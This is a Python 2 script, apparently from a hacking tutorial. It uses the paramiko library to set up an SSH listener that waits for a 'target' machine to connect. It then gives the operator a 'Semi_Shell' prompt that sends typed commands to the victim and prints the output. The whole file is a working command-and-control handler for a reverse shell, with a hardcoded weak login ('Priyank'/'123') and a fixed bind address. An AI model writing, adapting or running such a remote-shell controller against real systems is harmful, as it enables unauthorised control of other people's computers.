import socket #import socket
import sys #importing system
import threading #import threading
import paramiko #importing paramkiko . Please install pramiko library first.



host_key = paramiko.RSAKey(filename='/root/Desktop/test_rsa.key') #keyfile location

class Server (paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()#start threading

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == 'Priyank') and (password == '123'):#authentication 
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


try:
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('192.168.1.22' , 22))#IP and port number bind to socket
    sock.listen(1)
    print '[+] Listening for connection ...'#waiting for target to connect

except Exception, e:
    print '[-] Listen/Bing failed2: ' + str(e)


try:
    client, addr = sock.accept()
    print '[+] Got a connection from ' + str(addr)
    t = paramiko.Transport(client)
    t.load_server_moduli()
    t.add_server_key(host_key)
    server = Server()
    t.start_server(server=server)
    global chan
    chan = t.accept(1)
    print chan.recv(1024)
    chan.send("Oh yes i can see that")

except:
    print "[-] Connection Terminated!"
    pass#connection terminated if error comes



while True:
    command= raw_input("Semi_Shell>> ")#takes input from user for shell
    chan.send(command)#command is passed
    print chan.recv(1024)#reply is printed to the server side

    


    





    
    
